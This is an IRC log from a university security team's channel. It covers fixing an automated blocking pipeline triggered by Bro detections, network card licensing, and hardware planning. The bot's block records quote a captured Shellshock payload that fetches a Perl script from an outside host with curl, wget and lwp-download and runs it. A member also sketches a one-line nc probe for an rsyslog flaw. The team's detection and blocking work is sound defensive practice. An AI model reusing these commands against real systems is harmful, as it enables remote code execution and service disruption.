2014-09-26 21:52:09	jazoff	hmm, something still not working with bhring that notice
2014-09-26 21:53:42	jazoff	ninfo bhlist 128.179.148.214
2014-09-26 21:53:43	ncsabot	Empty Result
2014-09-26 21:54:02	jazoff	yeah, something not right
2014-09-26 21:55:42	jazoff	not sure what the problem is.. adding more logging is probably the only way to figure it out
2014-09-26 21:56:32	jazoff	bro-> bhr block script -> dirque -> queue runner -> ssh -> bhr system.. must be getting dropped somewhere
2014-09-26 21:57:07	jazoff	if the queue runner fails or ssh fails it would stay in the queue, so whatever it is, it is silently failing
2014-09-26 21:57:13	jazoff	ninfo bhrhistory 128.179.148.214
2014-09-26 21:57:38	ncsabot	Empty Result
2014-09-26 21:58:03	jazoff	ninfo bhrhistory 190.109.214.13
2014-09-26 21:58:23	ncsabot	Empty Result
2014-09-26 21:59:11	jazoff	oh, actually, maybe that plugin is failing, since that was a regular scan notice
2014-09-29 08:22:38	jazoff	ah, I figured it out.. turns out it is something stupid
2014-09-29 08:23:02	jazoff	the bash-cve-2014-6271.bro does not set the notice $sub field
2014-09-29 09:11:45	wardog	jazoff: for not blocking?
2014-09-29 09:11:52	jazoff	yeah
2014-09-29 09:12:19	jazoff	the bhr script used notice$msg and notice$sub for the reason that gets put into the bhr system
2014-09-29 09:12:31	jazoff	so bro was throwing errors that $sub wasn't defined
2014-09-29 09:12:33	wardog	is the RI IRC server down too?
2014-09-29 09:12:44	jazoff	it would appear so
2014-09-29 09:12:50	wardog	https://www.youtube.com/watch?v=Emdzsz_XvfA
2014-09-29 09:31:22	jazoff	some of the bash alerts were from qualys
2014-09-29 09:32:01	wardog	Those aren't getting blocked, right?
2014-09-29 09:32:30	jazoff	well, nothign was getting blocked
2014-09-29 09:32:36	jazoff	but yeah, qualys si whitelisted in bro
2014-09-29 09:47:59	jazoff	well, it should be fixed, there have not been any notices since i fixed it
2014-09-29 09:52:00	jazoff	did qualys flag any of the hosts as vulnerable?
2014-09-29 09:52:42	eyrich	yes - psl-bw and psb-bw
2014-09-29 09:53:00	eyrich	i ccd irst on the email to help+neteng
2014-09-29 09:53:29	jazoff	ah
2014-09-29 09:53:33	jazoff	did it do that via http test or via rpm?
2014-09-29 09:53:53	eyrich	package i think
2014-09-29 10:20:41	soehlert	jazoff: any update on the myricom stuff? who is deciding this?
2014-09-29 10:23:38	jazoff	i don't know..
2014-09-29 10:24:05	jazoff	i don't really have an opinion on how we proceed.. probably less work in the long run to move to the 3.x driver now when we have the chance though
2014-09-29 10:25:20	soehlert	wardog: is that a you question or an adam one?
2014-09-29 10:26:20	wardog	Adam seems to know how to get licenses, I would ping him.
2014-09-29 10:27:56	soehlert	ok
2014-09-29 10:32:26	wardog	http://www.theregister.co.uk/2014/09/25/amazon_readies_global_glory_reboot/
2014-09-29 10:37:48	jazoff	yeah, my friend works for a company that uses ec2 a lot and was complaing about that
2014-09-29 10:38:03	jazoff	fortunately I did not run into any issues this weekend
2014-09-29 10:38:36	jazoff	was using heroku+ec2+twilio, plus the timing controller cloud streaming stuff runs on top of ec2 in the first place
2014-09-29 10:47:07	jazoff	doh, bhr'ing bash stuff still not working
2014-09-29 10:49:46	jazoff	oh, yeah, the fix is incomplete
2014-09-29 10:50:06	jazoff	i defaulted sub to '' but that will just get stripped when I read the file so the number of fields is wrong
2014-09-29 10:50:56	jazoff	really i just need to fix liams script, half of what is in $msg should be in $sub
2014-09-29 10:56:00	jazoff	ok, third times the charm
2014-09-29 10:57:06	jazoff	soehlert: should I contact myricom sales?
2014-09-29 11:02:42	soehlert	yes please
2014-09-29 11:20:59	jazoff	so what's the deal with the unlicensed nics in the supercell cluster?
2014-09-29 11:21:35	jazoff	seems many of the boxes have 2 cards but only one is licensed
2014-09-29 11:34:47	soehlert	ya we originally bought 10G nics for everything and had multiple in each box, but then only had enough gigamon space for one in each cluster box
2014-09-29 11:35:00	soehlert	basically we got offered bw money at the start and our eyes were a little too big haha
2014-09-29 11:48:09	jazoff	what is odd is we have 16 lincenses
2014-09-29 11:48:17	jazoff	and like 18 cards in the supercell cluster
2014-09-29 11:48:29	jazoff	but only 8 or so are lincesed (the ones we are using)
2014-09-29 11:48:32	soehlert	8 workers x 2 cards + manager w/ 2 cards
2014-09-29 11:48:41	jazoff	but it's not
2014-09-29 11:48:46	soehlert	dunno why they decided our manager needed cards as weel
2014-09-29 11:48:48	soehlert	it was
2014-09-29 11:48:52	soehlert	but then i fixed it
2014-09-29 11:48:56	jazoff	[root@nids-23 ~]# /opt/snf/sbin/myri_license
2014-09-29 11:48:56	jazoff	2 boards found
2014-09-29 11:48:56	jazoff	NIC 0 serial = 403857
2014-09-29 11:48:56	jazoff	License keys:
2014-09-29 11:48:56	jazoff	  583f-8b6c-452a-57c2:2:403857:SNF:V2: # SNF, V2
2014-09-29 11:48:58	jazoff	NIC 1 serial = 401622
2014-09-29 11:49:01	jazoff	No license key currently programmed
2014-09-29 11:49:25	soehlert	i understand that, but we realized we couldnt use the second nic so we didnt bother loading the license
2014-09-29 11:50:36	wardog	hmmm
2014-09-29 11:50:48	soehlert	of course that means we shouldnt buy so many this time
2014-09-29 11:50:52	wardog	anyone notice those wsatched country logins on the informatics systems?
2014-09-29 11:51:19	soehlert	likely boris yet again
2014-09-29 11:51:21	jazoff	romania again?
2014-09-29 11:51:35	soehlert	he "usually uses the vpn, but forgot this time" every time
2014-09-29 11:51:42	wardog	sigh
2014-09-29 11:52:57	wardog	Well... They *are* from the same subnet.
2014-09-29 11:53:50	jazoff	soehlert: ah, the thing is that second serial number is not in the license file
2014-09-29 11:53:51	wardog	Das a big subnet. 109.96.0.0 - 109.103.255.255
2014-09-29 11:54:03	soehlert	does it matter?
2014-09-29 11:54:26	jazoff	so....
2014-09-29 11:54:37	jazoff	we have 16 lincenses, I see where 8 of them go, no idea where the other 8 go
2014-09-29 11:54:46	soehlert	my point is we dont' need 16
2014-09-29 11:54:53	jazoff	i guess a few went to the other dev cluster, but i don't remember how many cards that had
2014-09-29 11:55:09	soehlert	we originally thought we were going to use 2 nics in each worker, so we bought 16. then we realized gigamon limited us to only being able to use one per worker
2014-09-29 11:55:23	jazoff	right.. but the 16 we have do NOT correspond to the 16 cards we have
2014-09-29 11:56:02	soehlert	in what way. 8 of the serials are the 8 in the license files yes?
2014-09-29 11:56:51	jazoff	yes
2014-09-29 11:57:09	soehlert	so then im confused where the issue lies besides the fact that we have 8 unused nics
2014-09-29 11:58:00	jazoff	right, 8 unused nics, and 8 liceses for some other cards
2014-09-29 11:58:14	soehlert	which we arent using. so just get 8 licenses for the 8 we are using
2014-09-29 11:59:25	jazoff	ok!
2014-09-29 11:59:26	jazoff	:)
2014-09-29 11:59:38	soehlert	if we need more later for whatever reason, we can just order more then
2014-09-29 11:59:50	jazoff	oh, what about the dev cluster/machine?
2014-09-29 11:59:56	jazoff	drought.. that currently has the demo license
2014-09-29 12:00:10	soehlert	ahh ya probably want one there as well i would assume if you see value in using that machine still
2014-09-29 12:01:55	jazoff	yeah, for random testing
2014-09-29 12:02:32	soehlert	makes sense to me, im sure adam is fine with going from 16 to 9
2014-09-29 12:04:04	jazoff	or 10.. might be best to license both in the dev box
2014-09-29 12:04:13	soehlert	fair enough.
2014-09-29 12:04:21	soehlert	says the guy who has no idea of budgets
2014-09-29 12:09:43	jazoff	:)
2014-09-29 13:15:45	jazoff	bash exploit attempts really have slowed down
2014-09-29 13:15:50	jazoff	makes it annoying to test the bhr process
2014-09-29 13:19:46	jazoff	hmm, should have been one around 12:59
2014-09-29 13:20:36	jazoff	oh! it did!
2014-09-29 13:20:45	jazoff	ninfo bhlist 92.63.133.129
2014-09-29 13:20:46	ncsabot	Empty Result
2014-09-29 13:22:31	jazoff	you lie
2014-09-29 13:22:39	jazoff	oh, actually, it would be unblocked by now
2014-09-29 13:22:44	jazoff	ninfo bhrhistory 92.63.133.129
2014-09-29 13:23:10	ncsabot	<14>Sep 29 13:20:55 cygnus BHR_BLOCK: IP=92.63.133.129 HOSTNAME=chalkville.melbourne.co.uk WHO=bro WHY="Bash::HTTP_Header_Attack: 92.63.133.129 may have attempted to exploit CVE-2014-6271, bash environment variable attack, via HTTP mod_cgi header against 141.142.234.94 submitting "HOST"="() { :; }; "exec('/bin/bash -c cd /tmp ; curl -O http://xr0b0tx.com/shock/cgi ; perl /tmp/cgi ; rm -rf /tmp/cgi ; lwp-download http://xr0b0tx.com/shock
2014-09-29 13:23:11	ncsabot	i ; perl /tmp/cgi ; rm -rf /tmp/cgi;')"; "system('/bin/bash -c cd /tmp ; curl -O http://xr0b0tx.com/shock/cgi ; perl /tmp/cgi ; rm -rf /tmp/cgi ; lwp-download http://xr0b0tx.com/shock/cgi ; perl /tmp/cgi ;rm -rf /tmp/cgi ; wget http://xr0b0tx.com/shock/cgi ; perl /tmp/cgi ; rm -rf /tmp/cgi;')";"" UNTIL=1412019663 DURATION=4808
2014-09-29 13:23:11	ncsabot	<14>Sep 29 13:20:06 cygnus BHR_UNBLOCK: IP=92.63.133.129 WHO=cronjob WHY="Block Time Expired"
2014-09-29 13:23:13	ncsabot	<14>Sep 29 13:00:04 cygnus BHR_BLOCK: IP=92.63.133.129 HOSTNAME=chalkville.melbourne.co.uk WHO=bro WHY="Bash::HTTP_Header_Attack: 92.63.133.129 may have attempted to exploit CVE-2014-6271, bash environment variable attack, via HTTP mod_cgi header against 141.142.234.94 submitting "HOST"="() { :; }; "exec('/bin/bash -c cd /tmp ; curl -O http://xr0b0tx.com/shock/cgi ; perl /tmp/cgi ; rm -rf /tmp/cgi ; lwp-download http://xr0b0tx.com/shock
2014-09-29 13:23:19	ncsabot	i ; perl /tmp/cgi ; rm -rf /tmp/cgi;')"; "system('/bin/bash -c cd /tmp ; curl -O http://xr0b0tx.com/shock/cgi ; perl /tmp/cgi ; rm -rf /tmp/cgi ; lwp-download http://xr0b0tx.com/shock/cgi ; perl /tmp/cgi ;rm -rf /tmp/cgi ; wget http://xr0b0tx.com/shock/cgi ; perl /tmp/cgi ; rm -rf /tmp/cgi;')";"" UNTIL=1412014504 DURATION=900
2014-09-29 13:23:31	jazoff	:)
2014-09-29 13:23:42	jazoff	so, all Liam's fault :)
2014-09-29 13:24:20	jazoff	all n$msg and no n$sub make bhr policy unhappy
2014-09-29 13:24:52	jazoff	I did just realize, granted it should have been auto patched by now
2014-09-29 13:25:27	jazoff	oh, and I re-wrote it anyway, but I the original bro bhr thing I built at UA used environment variables to pass the msg/sub to the blocker tool 
2014-09-29 13:25:47	jazoff	so that would have been a fun bug
2014-09-29 13:28:13	soehlert	damn those commands are nasty
2014-09-29 13:28:36	soehlert	haha nice on the env vars at UA
2014-09-29 13:29:57	jazoff	bro used to have an execute_with_notice function that was really nice
2014-09-29 13:30:18	jazoff	since you'd just exec 'block.py' and then env['note'] enb['sub'] etc would exist
2014-09-29 13:30:57	jazoff	which amusingly, was to help avoid command injection attacks from doing something like fmt("./block.py %s %s", n$msg, ...)
2014-09-29 13:53:43	jazoff	eyrich: probably a good thing that the bhr code no longer does
2014-09-29 13:53:44	jazoff	system("logger ".$logprepend."_BLOCK IP=$ipaddress HOSTNAME=$log_hostname WHO=$servicename WHY=$reason UNTIL=$endtime");
2014-09-29 13:53:46	jazoff	too :)
2014-09-29 13:54:57	jazoff	pretty nice that we are going from bro->python->queue->ssh->perl->sql and it just works :)
2014-09-29 13:56:33	eyrich	since someone choose to put in the whole url string into the logs - yes. 
2014-09-29 14:07:43	eyrich	wardog: are you on the call?
2014-09-29 14:33:03	wardog	eyrich: guess you know the answer to that
2014-09-29 14:33:04	wardog	:)
2014-09-29 14:39:06	eyrich	wardog: you want to poke NetEng about the BW perfsonar boxes
2014-09-29 14:39:18	eyrich	no one has grabbed the ticket yet
2014-09-29 14:39:20	eyrich	https://help.ncsa.illinois.edu/Ticket/Display.html?id=15563
2014-09-29 15:21:12	jazoff	so the bash stuff has definitely slowed, granted half the scanners seemed to be researchers
2014-09-29 15:21:26	jazoff	i guess rumors a full out worm were unfounded
2014-09-29 15:25:17	eyrich	wardog: neteng hardly responds to irc anymore
2014-09-29 15:35:14	wardog	i know. I have it on the bw meeting agenda for tomorrow
2014-09-29 15:49:29	soehlert	did you know that this is a valid command? $ man -a tee
2014-09-29 15:49:32	soehlert	fun fact for the day
2014-09-29 15:50:33	wardog	Just need a 'c cow' now
2014-09-29 15:50:41	soehlert	hah
2014-09-29 15:58:01	jazoff	there's lots of funny unix commands like that
2014-09-29 15:58:35	eyrich	but you would prefer to write them in python   :)
2014-09-29 15:58:59	soehlert	heh you should write a python wrapper for bash and remove shellshock
2014-09-29 16:20:35	wardog	I think the silence means he's doing it.
2014-09-29 16:20:53	wardog	Or at least has figured out how to do it in his head.
2014-09-29 16:23:46	soehlert	jazoff: how hard is it gonna be to convert flows-sec to centos?
2014-09-29 16:29:32	jazoff	shouldn't be too hard.. I'd like to just setup another box and cutover though
2014-09-29 16:29:42	jazoff	asuming we have one
2014-09-29 16:29:55	soehlert	ya we can do that, just making sure it's all puppetized 
2014-09-29 16:30:20	jazoff	yeah.. I even got an rpm to build for nfsen
2014-09-29 16:30:28	jazoff	kinda of hackish, but it worked
2014-09-29 16:30:43	soehlert	perfect. that's on the horizon then
2014-09-29 16:52:01	jazoff	ok. no problems expected, just that we lose data while the server is off so it would be nice to do it as a cutover
2014-09-29 16:52:27	soehlert	yup that can be done
2014-09-30 11:05:55	-->	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has joined #security
2014-09-30 11:09:22	jschipp	fyi: I'm moving ngaios-sec to CentOS today
2014-09-30 12:25:49	soehlert	jazoff: can you get ncsabot into the netsec room?
2014-09-30 12:30:34	jazoff	just invite it
2014-09-30 12:31:29	soehlert	gonna sound dumb, didnt know that was a thing
2014-09-30 12:34:52	jazoff	:)
2014-09-30 12:35:12	jazoff	you can configure auto join, but that doesnt seem work right with our servr
2014-09-30 12:35:26	soehlert	god im not looking forward to puppetizing irc server
2014-09-30 12:41:05	jazoff	whys that? 
2014-09-30 12:41:40	soehlert	because we kept having problems figuring out the config file as it is
2014-09-30 13:14:19	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Ping timeout)
2014-09-30 15:32:21	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-09-30 15:54:01	jschipp	yay, nagios-sec is done
2014-09-30 15:54:14	eyrich	dont delete it 
2014-09-30 15:54:27	jschipp	:)
2014-09-30 15:57:46	soehlert	tornado has / mounted with errors=panicwq
2014-09-30 15:57:58	soehlert	minus the wq...im not in vim, im in irc
2014-09-30 17:30:09	jazoff	myricom v3 upgrade licences are 355.50 each
2014-10-01 00:04:02	wardog	how many do we need?
2014-10-01 07:31:51	jazoff	10
2014-10-01 07:32:07	jazoff	we currently have 16, but I can really only account for 10 of them
2014-10-01 08:50:24	wardog	can we do for now and wait for the new cluster hardware or do we need to licenses now?
2014-10-01 08:50:54	jazoff	we don't need the licenses if we reinstall the v2 driver
2014-10-01 08:52:00	wardog	http://xenbits.xen.org/xsa/advisory-108.html
2014-10-01 08:54:43	eyrich	are there any performance numbers on the different between v2 and v3?
2014-10-01 08:55:57	jazoff	I don't know.. I'm more concerned about long term support
2014-10-01 08:56:01	wardog	So, we NEED 10?
2014-10-01 08:56:20	jazoff	yeah, 8 for supercell cluster and 1 or 2 for the dev box
2014-10-01 08:56:36	wardog	I saw we install v2 for now until we can order the new cluster systems and then order v3 licensing with the new systems.
2014-10-01 08:56:39	wardog	say.
2014-10-01 08:56:46	jazoff	ok
2014-10-01 09:02:02	jazoff	reinstalling it on drought for testing
2014-10-01 09:05:23	wardog	jazoff. can you send me the block numbers for this month. The numbers I'm pulling from Splunk seem shady.
2014-10-01 09:05:26	wardog	select month, reason, count(1) from (select date_trunc('month', block_when) as month, (string_to_array(block_why, ' '))[1] as reason from blocklog where block_who='bro') as foo group by month, reason order by month,reason;
2014-10-01 09:06:10	wardog	and ossec: select month, count(1) from (select date_trunc('month', block_when) as month from blocklog where block_who='secops') as foo group by month order by month asc;
2014-10-01 09:06:14	eyrich	https://www.myricom.com/software/sniffer10g/975-what-additional-software-features-enhancements-were-introduced-in-the-sniffer10g-v3-software.html
2014-10-01 09:06:46	wardog	Arista DANZ ts support.
2014-10-01 09:06:57	eyrich	4,6,7 look useful
2014-10-01 09:07:05	eyrich	danz time stamping - we dont do
2014-10-01 09:11:03	jazoff	yeah, #4 is big
2014-10-01 09:12:20	jazoff	that alone might make it worthwhile
2014-10-01 09:12:37	eyrich	i guess it depends if we any bottle necks passed the nic (cpu/IO), if we do i;m not sure why we wouldnt just copy the traffic at the tap/ag layer and send to other boxes
2014-10-01 09:12:59	jazoff	well one thing that comes up often is not being able to run tcpdump for troubleshooting while bro is running
2014-10-01 09:13:56	eyrich	i dont get that use case. you are not getting all the traffic to/from a specific ip on a single bro node
2014-10-01 09:15:00	eyrich	i like the command line to arista API way of having the tap/ag filter and direct the wanted traffic to a seperate pcap box
2014-10-01 09:16:27	jazoff	i guess you're right :)
2014-10-01 09:17:45	eyrich	it might be cool to do pcap and bro on a single box, that we are directing traffic to from the tap/ag - with very deep dive bro stuff enabled
2014-10-01 09:25:39	jazoff	rebooting drought
2014-10-01 09:25:57	jazoff	i swapped out the v3 driver with the v2 driver on repo-sec and uninstalled it on drought
2014-10-01 09:26:05	jazoff	after rebooting puppet should reinstall it using v2
2014-10-01 09:31:11	wardog	jazoff: ?
2014-10-01 09:31:20	wardog	bhr nums
2014-10-01 09:33:12	jazoff	oh, you did not get email from cygnus?
2014-10-01 09:33:28	jazoff	subject 'bhr report' ?
2014-10-01 09:33:31	wardog	sigh
2014-10-01 09:33:34	wardog	let me check
2014-10-01 09:33:53	wardog	there it is
2014-10-01 09:34:09	wardog	https://twitter.com/warquel/status/517319935073480705
2014-10-01 09:34:17	wardog	I blame that.
2014-10-01 09:34:47	wardog	yeah, those numbers are WAY different then I see from splunk.
2014-10-01 09:36:24	wardog	seems like there was an overall spike in August
2014-10-01 09:36:47	wardog	Thank you
2014-10-01 09:38:53	jazoff	ok, taht seems to work
2014-10-01 09:39:03	jazoff	so I should be fine to rebuild the supercell cluster worker nodes now
2014-10-01 09:39:27	jazoff	can we take one box out of the gigamon, rebuild it, then add it back in?
2014-10-01 09:40:18	soehlert	im fine with that if eyrich is
2014-10-01 09:40:34	jazoff	maybe do 2.. if that goes well we can do the other 6
2014-10-01 09:41:00	jazoff	i don't expect any major issues there. just need to review the config for supercell itself
2014-10-01 09:41:08	jazoff	pretty sure it's 100% in puppet, but want to verify
2014-10-01 09:41:11	soehlert	that might have to happen next week. im off friday, so i wanna make sure we can get em all done
2014-10-01 09:41:24	jazoff	ok
2014-10-01 09:41:29	soehlert	without a big chunk of time in the middle that is
2014-10-01 09:41:37	jazoff	I get to work from SF next week :)
2014-10-01 09:41:46	jazoff	well, "get to" / "have to" :)
2014-10-01 09:41:55	soehlert	for nike?
2014-10-01 09:42:12	wardog	I suggest Good Luck Dim Sum on Clement.
2014-10-01 09:42:14	jazoff	yeah.. need to babysit setup/teardown of some stuff each day
2014-10-01 09:42:16	wardog	Best dim sum....
2014-10-01 09:42:37	jazoff	race isn't for 2 weeks (thankfully, the website is STILL not ready)
2014-10-01 09:42:37	soehlert	mmm dim sum
2014-10-01 09:42:37	soehlert	theres actually a really good dim sum place in the golden nugget in vegas
2014-10-01 09:43:34	jazoff	oh, almost forgot, made an eye DR appointment this afternoon, new script. should fix my headaches i've been getting
2014-10-01 10:34:41	eyrich	live migration of most node02 vms starting now
2014-10-01 10:54:38	soehlert	oh my god this wysiwyg editor for the wiki is awful. If I put the cursor at the beginning of a line to remove whitespace above it, it moves up a line and puts the cursor at the end of the line! WHY?!
2014-10-01 11:00:41	jazoff	confluence?
2014-10-01 11:00:56	soehlert	ya
2014-10-01 11:02:08	jazoff	yeah, they got rid of the 'wiki markup' view
2014-10-01 11:02:14	soehlert	right
2014-10-01 11:02:17	jazoff	though you can at least still type the markup
2014-10-01 11:02:26	jazoff	if you type h1. foo it converts it on the fly
2014-10-01 11:02:40	soehlert	ya i just didnt think deleting two blanks lines would be so difficult
2014-10-01 11:04:08	eyrich	vsa0 powered off, node02 powering down
2014-10-01 13:14:55	soehlert	jazoff: how is the isshd stuff on bro set up. specifically what part of bro is told to look for stuff coming from ssllogmux?
2014-10-01 13:17:05	jazoff	ummm
2014-10-01 13:17:22	soehlert	ya sorry im not sure i know how to word this question
2014-10-01 13:17:30	jazoff	modules/bro/files/sshd_audit_mux.init
2014-10-01 13:17:39	jazoff	no, i understood, I just didnt remmeber
2014-10-01 13:18:39	soehlert	hmm do you know how it's doing this on derecho? 
2014-10-01 13:19:49	jazoff	rc.local maybe?
2014-10-01 13:19:58	jazoff	i remember it not being very well done
2014-10-01 13:20:13	soehlert	and im not sure i asked that right, or i dont understand your init script. that just starts sshd_audit_mux.
2014-10-01 13:20:13	soehlert	what i mean to ask is how bro is aware of the stuff coming from ssllogmux
2014-10-01 13:20:36	jazoff	oh
2014-10-01 13:21:13	jazoff	modules/bro/files/configuration/site.ssh/local.bro
2014-10-01 13:21:18	jazoff	redef Communication::nodes += {
2014-10-01 13:21:18	jazoff	    ["sshd_audit_server"] = [$host = 127.0.0.1, $events = /.*/, $connect=F, $ssl=F]
2014-10-01 13:21:21	jazoff	};
2014-10-01 13:21:26	jazoff	i think
2014-10-01 13:21:50	soehlert	ah yes that looks right 
2014-10-01 13:21:52	soehlert	thanks
2014-10-01 13:45:49	jazoff	we doing meeting?
2014-10-01 13:46:45	wardog	I have one topic that we can probably just discuss on IRC, otherwise Eyrich is busy over at NPCF.
2014-10-01 13:46:55	jazoff	discuss away :)
2014-10-01 13:47:40	wardog	The HPs we use are starting to reach end of warranty (2-3 years). Trying to replace them all at once doesn't seem feasible due to budgetary constraints.
2014-10-01 13:48:09	wardog	Are you guys ok with getting 2-4 servers a year with 5 year warranties each and just cycling through those moving forward?
2014-10-01 13:48:24	wardog	We can afford that with the ISF budget, just not replacing all our hardware in the same year.
2014-10-01 13:48:46	soehlert	that probably makes sense, especially since we're trimming down what's actual hardward
2014-10-01 13:49:24	wardog	So, the question boils down to, what exactly services do we need hardware for, bro aside.
2014-10-01 13:49:45	soehlert	oh this convo again :)
2014-10-01 13:50:00	wardog	:D
2014-10-01 13:50:01	soehlert	bro stuff, esx hardware, flows, logs, splunk, ossec
2014-10-01 13:51:03	jschipp	http://www.rsyslog.com/remote-syslog-pri-vulnerability/
2014-10-01 13:51:21	jazoff	that does not look like a fun link
2014-10-01 13:51:41	soehlert	im scared to look
2014-10-01 13:51:41	jschipp	just send "<201>" lol
2014-10-01 13:51:43	jschipp	as the PRI
2014-10-01 13:51:55	jschipp	I might write a trafgen config for this
2014-10-01 13:52:37	jschipp	I just upgraded the relays, shouldn't be vulnerably anymore
2014-10-01 13:52:43	jazoff	echo "<201> lol" | nc -u host port ?
2014-10-01 13:52:53	soehlert	and they only allow traffic from the load balancer right?
2014-10-01 13:53:06	jschipp	not quite, you still need to be RFC compliant with the rest of the message 
2014-10-01 13:53:54	jschipp	change these lines: https://github.com/jonschipp/gencfg/blob/master/plugins/syslog.sh#L46-L48
2014-10-01 13:53:58	jschipp	:)
2014-10-01 13:54:25	wardog	logs is not virtual?
2014-10-01 13:54:31	wardog	ser, seclogs
2014-10-01 13:54:33	wardog	er
2014-10-01 13:54:36	soehlert	no
2014-10-01 13:55:38	wardog	Ok, other than Bro I have, 2 splunk indexers, 2 ESX nodes, 1 flow collector, 1 OSSEC system, 1 Cuckoo Sandbox.
2014-10-01 13:55:41	wardog	What else?
2014-10-01 13:55:54	wardog	Do we need one for scanning?
2014-10-01 13:55:55	soehlert	it's more like 6 esx nodes
2014-10-01 13:56:06	wardog	Oooh, the test ones too
2014-10-01 13:56:18	wardog	test, dev, etc
2014-10-01 13:56:18	soehlert	hail, haboob, flood, plus i think esx setup at pcf has a third
2014-10-01 13:56:24	wardog	what's flood?
2014-10-01 13:56:42	soehlert	flood is the one in 3003 with dew/cerberus4/kippo on it
2014-10-01 13:57:27	soehlert	and no the scanning box doesn't need to be hardware (and isnt)
2014-10-01 13:57:52	wardog	Ok, got 11 servers so far.
2014-10-01 13:58:03	wardog	What about future projects?
2014-10-01 13:58:19	soehlert	ya i was thinking that, but reading the future is hard
2014-10-01 13:58:39	soehlert	possibly a pentesting box? but im not sure that couldn't be virtualized. is cif virtual?
2014-10-01 13:58:51	wardog	cif is virtual
2014-10-01 13:59:24	soehlert	maybe another esx? i wouldnt mind having a proper set up for the stuff here
2014-10-01 14:00:29	wardog	I think the idea is, in a few years we get 2 more ESX servers and the current ones would be demoted. They don't have to replace haboob/flood/hail, but they could potentially be used as a secondary ESX cluster.
2014-10-01 14:00:58	wardog	What about surricata or time machine?
2014-10-01 14:01:10	soehlert	ok i guess that works we can probably scrounge up something to get a real cluster here.
2014-10-01 14:01:10	soehlert	oh ya time machine would be cool
2014-10-01 14:01:21	jazoff	ah, yeah
2014-10-01 14:01:26	jazoff	time machine++
2014-10-01 14:01:56	wardog	Just 1 beefy server for that right?
2014-10-01 14:03:00	wardog	Another possibility could be extending warranty on some of th HP servers, but only use those for backup or secondary servers for production physical systems. Or, not worrying about warranty on those and cannibalizing as we go along.
2014-10-01 14:04:00	soehlert	we've already begun the canibalization :)
2014-10-01 14:04:25	soehlert	but i think it's become a preference to move to dells so probably don't want to extend these
2014-10-01 14:04:59	jschipp	whip around?
2014-10-01 14:05:17	wardog	that's what we're doing right now.
2014-10-01 14:05:41	wardog	well, discussing the physical server issue.
2014-10-01 14:05:52	wardog	This is what I have so far: https://wiki.ncsa.illinois.edu/display/CSD/IRST+Hardware+Replacement+Plan
2014-10-01 14:07:01	wardog	regarding other things. Looks like logs are properly going to seclogs now.
2014-10-01 14:07:15	wardog	We were missing about 1k hosts there for a bit
2014-10-01 14:07:22	soehlert	and i think i finally figured out what was wrong with centos seclogs, but gotta wait a couple days to make sure
2014-10-01 14:08:30	wardog	Well, let's go ahead and meet then in the meeting room.
2014-10-01 14:08:35	wardog	I it'll be faster.
2014-10-01 14:09:40	wardog	jazoff: 217-300-3465
2014-10-01 14:09:54	jazoff	ok
2014-10-01 14:40:01	<--	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has quit (Ping timeout)
2014-10-01 17:33:24	-->	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has joined #security
2014-10-02 10:12:52	soehlert	jschipp: do you have the bwbh_user_check script on your machine?
2014-10-02 10:16:02	wardog	Something just came up in the BW review called 'Topology Aware SW' tasked to Cybersecurity. Does that sound familiar to anyone?
2014-10-02 10:16:20	eyrich	nope
2014-10-02 10:16:24	soehlert	never heard of it
2014-10-02 10:16:48	wardog	https://wiki.ncsa.illinois.edu/display/BWINTERNAL/NSF+Review+-+Fall+2014+-+internal
2014-10-02 10:17:17	wardog	I wonder if it's associated with the wrong group
2014-10-02 10:17:27	eyrich	thats what im thinking
2014-10-02 10:17:46	soehlert	it must be...unless this was their way of telling us about it.
2014-10-02 10:18:17	eyrich	sounds something like this:
2014-10-02 10:18:19	eyrich	https://www.tacc.utexas.edu/tacc-projects/topology-aware-mpi
2014-10-02 10:18:43	wardog	Yeah, the wiki has a lot about topology aware scheduling.
2014-10-02 10:20:33	wardog	Ok, someone just doesn't know how tables work.
2014-10-02 10:21:21	soehlert	well thats understandable. theres columns and rows and its just overwhelming
2014-10-02 10:24:26	wardog	so many cells....
2014-10-02 10:43:08	eyrich	wardog: iforge is being scanned now. I think it is rhel
2014-10-02 10:44:57	wardog	that works
2014-10-02 10:45:33	wardog	BTW, tomorrow's ComPol meeting is the first one to be open to all NCSA employees. If anyone is interested.
2014-10-02 10:46:54	soehlert	add a meeting to my schedule for fun?! 
2014-10-02 10:48:26	jschipp	soehlert: I do not
2014-10-02 10:48:56	soehlert	please get it and use it when you deal with ticekts, if you do it manually, the next time i use the script it picks up the ones you did manually and deals with them again
2014-10-02 10:49:27	jschipp	ah
2014-10-02 10:49:58	eyrich	what is the command on a rhel machine to show installed packages?
2014-10-02 10:50:04	soehlert	rpm -qa
2014-10-02 10:50:08	wardog	rpm -qa
2014-10-02 10:50:35	eyrich	wardog: bad news iforge login node doesnt have pgp installed
2014-10-02 10:51:33	wardog	yum list installed
2014-10-02 10:52:06	wardog	Why does it need pgp/gpg installed?
2014-10-02 10:52:14	eyrich	i meant php
2014-10-02 10:52:25	eyrich	so no scan results
2014-10-02 10:52:30	wardog	ah
2014-10-02 10:52:32	eyrich	we need to find a different system to test on
2014-10-02 10:52:46	wardog	Hmmm
2014-10-02 10:53:37	eyrich	im looking through the bw boxes we scan
2014-10-02 10:54:18	wardog	I doubt many will have php installed.
2014-10-02 10:57:54	eyrich	may have found one, running the scan now
2014-10-02 11:03:44	wardog	Red Lobster is the #4 restaurant in Chambana, according to tripadvisor. How dissapointing. http://www.tripadvisor.com/Restaurants-g35790-Champaign_Champaign_Urbana_Illinois.html
2014-10-02 11:03:59	soehlert	thats so awful and not true
2014-10-02 11:04:53	jazoff	eyrich: say, what's the background for this new bro script?
2014-10-02 11:05:03	jazoff	eyrich: i think I understand it but it might help if I know why it is being written 
2014-10-02 11:05:05	soehlert	crl stuff getting hammered
2014-10-02 11:05:11	jazoff	at least, i need to know what to name the notice :)
2014-10-02 11:05:31	jazoff	so, something like, ExcessiveCRLRequests?
2014-10-02 11:06:21	eyrich	we are essentially getting DOSd by some bad actors requesting CRLs, technically a host should only ask for a crl update 4 times a day, we have a few doing over a 1000
2014-10-02 11:06:39	jazoff	bad actors or just broken clients?
2014-10-02 11:06:52	eyrich	poorly configured
2014-10-02 11:07:12	jazoff	ok, sounds like a trivial sumstats script
